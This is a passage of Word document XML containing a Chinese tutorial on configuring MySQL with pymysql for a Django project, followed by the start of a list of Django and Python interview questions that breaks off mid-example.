        <w:t>打开MySQL终端，输入以下命令先创建数据库和用户，并给创建的用户授权。数据库名字，用户名和密码待会会用到。第一步和第二步非常重要。myapp.*表示授权操作myapp中所有的表。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B17BCD6" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">CREATE DATABASE myapp charset=utf8 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B42CB7" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">CREATE USER </w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>username</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>localhost</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> IDENTIFIED BY </w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>password</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A637B8" w14:textId="31D80986" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>GRANT ALL PRIVILEGES ON myapp.* TO 'username'@'localhost' IDENTIFIED BY 'password'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB44C1D" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>第三步 安装第三方库pymysql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11D8A5D7" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>需要借助于第三方库比如pymysql, Django才能直接访问MySQL数据库。进入虚拟环境(venv)后使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F5EF083" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如下命令安装pymysql。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383DAF67" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pip install pymysql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317EC5C8" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>然后在项目文件夹的__init__.py中文件中写入如下两行代码：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67764872" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import pymysql                                                                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC61F7F" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pymysql.install_as_MySQLdb()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EB31C10" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28484BE2" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>第四步 </w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>修改数据库配置文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7893EE2C" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>修改项目文件夹里的settings.py的文件，添加创建的数据库和用户信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E24FC5A" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DATABASES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF1F7F7" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    'default': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CC28E75" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>        'ENGINE': 'django.db.backends.mysql',   # 数据库引擎</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EDFDC2B" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>        'NAME': 'myapp',         # 你要存储数据的库名，事先要创建。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0E4A45" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>        'USER': 'root',         # 数据库用户名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4843FB3A" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>        'PASSWORD': '1234',     # 密码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7309C8D1" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>        'HOST': 'localhost',    # 默认主机</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5969F794" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>        'PORT': '3306',         # 数据库使用的端口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="514BDA22" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65FC1D5F" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13FFA93F" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>创建一个简单模型，使用如下命令，如果没有出现错误，那么恭喜你已经在Django项目中使用MySQL数据库啦。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520C804C" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>python manage.py makemigrations                                                                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44A2B61B" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>python manage.py migrate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31310320" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4051A9E2" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>小结</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728032E8" w14:textId="0CC3DA15" w:rsidR="00EF28F6" w:rsidRPr="00016AA9" w:rsidRDefault="00EF28F6" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>本文总结了Django自带数据库SQLite的应用场景和优缺点，并详细介绍了Django项目中如何配置使用MySQL数据库，喜欢就收藏吧。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06BB4352" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00D96E02" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:pBdr>
          <w:left w:val="single" w:sz="48" w:space="4" w:color="3D97CB"/>
          <w:bottom w:val="single" w:sz="6" w:space="8" w:color="5EA2D6"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="000000"/>
          <w:sz w:val="41"/>
          <w:szCs w:val="41"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId350" w:history="1">
        <w:r w:rsidR="00A63022">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:color w:val="0378BB"/>
            <w:sz w:val="41"/>
            <w:szCs w:val="41"/>
          </w:rPr>
          <w:t>Django</w:t>
        </w:r>
        <w:r w:rsidR="00A63022">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:color w:val="0378BB"/>
            <w:sz w:val="41"/>
            <w:szCs w:val="41"/>
          </w:rPr>
          <w:t>项目常见面试问题</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="59125670" w14:textId="131FF68C" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="004300AE"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001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>python</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>lambda</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>是什么意思，可以举例</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8AE2A0" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 匿名函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E24E917" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> a = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>lambda</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> x:x+1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="690F16CE" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(a(1))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07065C1E" w14:textId="485895CA" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="004300AE"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002</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>请写出以下代码执行的结果</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A08B143" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>class</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> Parent(object):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A8510F3" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> x = 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE81F05" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
